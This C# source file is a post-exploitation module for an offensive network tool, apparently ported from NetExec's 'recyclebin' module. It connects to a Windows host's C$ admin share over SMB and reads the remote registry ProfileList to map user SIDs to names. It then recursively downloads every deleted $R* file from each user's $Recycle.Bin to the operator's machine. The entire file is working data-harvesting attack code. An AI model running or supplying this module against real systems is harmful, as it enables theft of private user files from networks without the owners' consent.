using Titanis;
using Titanis.DceRpc.Client;
using Titanis.Msrpc;
using Titanis.Msrpc.Msrrp;
using Titanis.Msrpc.Mswkst;
using Titanis.Smb2;
using Titanis.Winterop.Registry;
using Titanis.Winterop.Security;

namespace Atlas.Protocols.Smb.Modules;

/// <summary>
/// NetExec recyclebin: downloads deleted ($R*) files, resolving SIDs to users.
/// </summary>
public sealed class SmbRecycleBinModule : AtlasModule<Smb2Client>
{
	public override string Name => "recyclebin";
	public override string Description => "Downloads recycled ($R*) files from C$\\$Recycle.Bin";

	public override async Task RunAsync(AtlasModuleContext<Smb2Client> ctx, CancellationToken cancellationToken)
	{
		int downloaded = 0;
		try
		{
			var sidToUser = await BuildSidMapAsync(ctx, cancellationToken).ConfigureAwait(false);
			List<Smb2DirEntry> sids;
			try
			{
				await using var rb = await ctx.Client.OpenDirectoryAsync(new UncPath(ctx.Host, "C$", "$Recycle.Bin"), cancellationToken).ConfigureAwait(false);
				sids = await rb.QueryDirAsync(cancellationToken).ConfigureAwait(false);
			}
			catch (Exception ex)
			{
				AtlasConsole.Info($"{ctx.Host}:445", $"(recyclebin) cannot list $Recycle.Bin: {ex.Message}");
				return;
			}
			foreach (var sidDir in sids)
			{
				if (!sidDir.IsDirectory || sidDir.FileName is "." or ".." || !sidDir.FileName.StartsWith("S-1-5-21-", StringComparison.OrdinalIgnoreCase))
					continue;
				string who = sidToUser.TryGetValue(sidDir.FileName, out var u) ? u : sidDir.FileName;
				string binDir = $"$Recycle.Bin\\{sidDir.FileName}";
				List<string> files = await SpiderAsync(ctx, "C$", binDir, string.Empty, 0, cancellationToken).ConfigureAwait(false);
				foreach (var rel in files)
				{
					string leaf = rel.Split('\\').Last();
					if (!leaf.StartsWith("$R", StringComparison.OrdinalIgnoreCase)) continue; // skip $I* metadata
					try
					{
						await using var stream = await ctx.Client.OpenFileReadAsync(new UncPath(ctx.Host, "C$", $"{binDir}\\{rel}"), cancellationToken).ConfigureAwait(false);
						using var ms = new MemoryStream();
						await stream.CopyToAsync(ms, cancellationToken).ConfigureAwait(false);
						string local = $"{ctx.Host}_{who}_recyclebin_{rel.Replace('\\', '_')}";
						await File.WriteAllBytesAsync(local, ms.ToArray(), cancellationToken).ConfigureAwait(false);
						downloaded++;
						AtlasConsole.Success($"{ctx.Host}:445", $"(recyclebin) {who}: {rel} ({ms.Length} bytes -> {local})");
					}
					catch { }
				}
			}
			AtlasConsole.Info($"{ctx.Host}:445", $"(recyclebin) {downloaded} file(s) downloaded");
		}
		catch (Exception ex)
		{
			AtlasConsole.Fail($"{ctx.Host}:445", $"(recyclebin) Failed: {ex.Message}");
		}
	}

	private static async Task<Dictionary<string, string>> BuildSidMapAsync(AtlasModuleContext<Smb2Client> ctx, CancellationToken ct)
	{
		var map = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
		try
		{
			RpcClient rpc = ctx.Services.CreateRpcClient();
			using RemoteRegistryClient reg = new RemoteRegistryClient();
			await rpc.ConnectPipe(reg, ctx.Client, new UncPath(ctx.Host, Smb2Client.IpcName, reg.WellKnownPipeName ?? "winreg"), ct).ConfigureAwait(false);
			await using var lm = await reg.OpenLocalMachine(RegistryAccessRights.KeyRead, ct).ConfigureAwait(false);
			await using var pl = await lm.OpenSubkey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList", RegistryAccessRights.KeyRead, RegistryKeyOptions.None, ct).ConfigureAwait(false);
			await foreach (var sub in pl.GetSubkeyNames(ct).ConfigureAwait(false))
			{
				try
				{
					await using var k = await pl.OpenSubkey(sub.KeyName, RegistryAccessRights.KeyRead, RegistryKeyOptions.None, ct).ConfigureAwait(false);
					var v = await k.GetValue("ProfileImagePath", ct).ConfigureAwait(false);
					string img = v.TypedValue?.ToString() ?? string.Empty;
					string user = img.Split('\\').Last().TrimEnd('\0');
					if (!string.IsNullOrEmpty(user)) map[sub.KeyName] = user;
				}
				catch { }
			}
		}
		catch { }
		return map;
	}

	private static async Task<List<string>> SpiderAsync(AtlasModuleContext<Smb2Client> ctx, string share, string absDir, string prefix, int depth, CancellationToken ct)
	{
		var out_ = new List<string>();
		if (depth > 4) return out_;
		List<Smb2DirEntry> entries;
		try
		{
			await using var d = await ctx.Client.OpenDirectoryAsync(new UncPath(ctx.Host, share, absDir), ct).ConfigureAwait(false);
			entries = await d.QueryDirAsync(ct).ConfigureAwait(false);
		}
		catch { return out_; }
		foreach (var e in entries)
		{
			if (e.FileName is "." or ".." || e.FileName.Equals("desktop.ini", StringComparison.OrdinalIgnoreCase)) continue;
			string rel = string.IsNullOrEmpty(prefix) ? e.FileName : $"{prefix}\\{e.FileName}";
			if (e.IsDirectory) out_.AddRange(await SpiderAsync(ctx, share, $"{absDir}\\{e.FileName}", rel, depth + 1, ct).ConfigureAwait(false));
			else out_.Add(rel);
		}
		return out_;
	}
}
